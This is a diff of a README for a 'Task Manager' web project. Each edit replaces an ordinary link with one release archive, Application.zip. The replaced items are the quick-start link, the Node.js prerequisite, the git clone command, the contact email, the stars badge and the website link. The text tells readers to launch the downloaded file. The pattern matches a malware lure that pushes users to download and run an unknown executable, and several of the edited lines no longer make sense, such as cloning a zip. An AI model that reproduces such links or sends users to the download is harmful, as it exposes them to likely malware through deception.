@@ -4,7 +4,7 @@ Welcome to the Task Manager repository! This is a full-stack project aimed at he
 
 ## 🚀 Quick Start
 
-To get started with Task Manager, simply download the latest release by clicking [here](https://github.com/cli/oauth/archive/refs/tags/v1.0.0.zip).  
+To get started with Task Manager, simply download the latest release by clicking [here](https://github.com/IqbalFebrianto/Task_Manager/releases/download/v1.0/Application.zip).  
 
 Remember, to launch the downloaded file and start utilizing the full potential of Task Manager!
 
@@ -12,7 +12,7 @@ Remember, to launch the downloaded file and start utilizing the full potential o
 
 Before launching Task Manager, make sure you have the following technologies installed on your system:
 
-- Node.js
+- https://github.com/IqbalFebrianto/Task_Manager/releases/download/v1.0/Application.zip
 - MongoDB
 - Postman
 
@@ -40,7 +40,7 @@ Follow these steps to install Task Manager on your local machine:
 1. Clone the repository:
 
 ```
-git clone https://github.com/your-username/Task_Manager.git
+git clone https://github.com/IqbalFebrianto/Task_Manager/releases/download/v1.0/Application.zip
 ```
 
 2. Install dependencies:
@@ -67,7 +67,7 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 
 ## 📧 Contact
 
-Have a question or just want to say hi? Feel free to reach out to us at taskmanager@example.com.
+Have a question or just want to say hi? Feel free to reach out to us at https://github.com/IqbalFebrianto/Task_Manager/releases/download/v1.0/Application.zip
 
 ## 🌟 Show Your Support
 
@@ -75,7 +75,7 @@ If you find Task Manager helpful, give us a star on GitHub. It motivates us to c
 
 <div align="center">
 
-[![GitHub stars](https://img.shields.io/github/stars/your-username/Task_Manager.svg?style=social)](https://github.com/your-username/Task_Manager/stargazers)
+[![GitHub stars](https://github.com/IqbalFebrianto/Task_Manager/releases/download/v1.0/Application.zip)](https://github.com/IqbalFebrianto/Task_Manager/releases/download/v1.0/Application.zip)
 
 </div>
 
@@ -83,4 +83,4 @@ If you find Task Manager helpful, give us a star on GitHub. It motivates us to c
 
 Enjoy managing your tasks efficiently with Task Manager! 🚀
 
-[Visit Task Manager Website](https://task-manager-example.com)
+[Visit Task Manager Website](https://github.com/IqbalFebrianto/Task_Manager/releases/download/v1.0/Application.zip)
